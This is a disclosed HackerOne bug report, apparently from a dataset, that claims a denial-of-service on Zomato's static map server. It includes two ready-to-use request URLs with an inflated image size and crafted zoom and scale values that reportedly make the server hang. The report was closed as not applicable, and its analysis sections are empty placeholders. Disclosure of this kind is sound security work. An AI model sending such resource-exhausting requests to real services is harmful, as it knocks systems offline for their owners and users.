---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '751904'
original_report_id: '751904'
title: Zomato Map server going out of memory while resizing map image
weakness: Heap Overflow
team_handle: zomato
created_at: '2019-12-05T11:20:34.840Z'
disclosed_at: '2019-12-05T12:00:35.394Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 9
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- heap-overflow
---

# Zomato Map server going out of memory while resizing map image

## Metadata

- HackerOne Report ID: 751904
- Weakness: Heap Overflow
- Program: zomato
- Disclosed At: 2019-12-05T12:00:35.394Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Go to

https://maps.zomato.com/php/staticmap?center=0,0&size=240x150&maptype=zomato&markers=180,180,pin_res32&sensor=false&scale=%&zoom=eval(2147483647+1)&language=en

a map will be displayed

Now increase the map size by 10x

https://maps.zomato.com/php/staticmap?center=0,0&size=2400x1500&maptype=zomato&markers=180,180,pin_res32&sensor=false&scale=%&zoom=eval(2147483647+1)&language=en

It will always timeout after waiting from 1-15 minutes

POC video is attached.

## Impact

Zomato Map servers can be bought down making map feature completely non functional and causing millions of dollars loss for Zomato.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
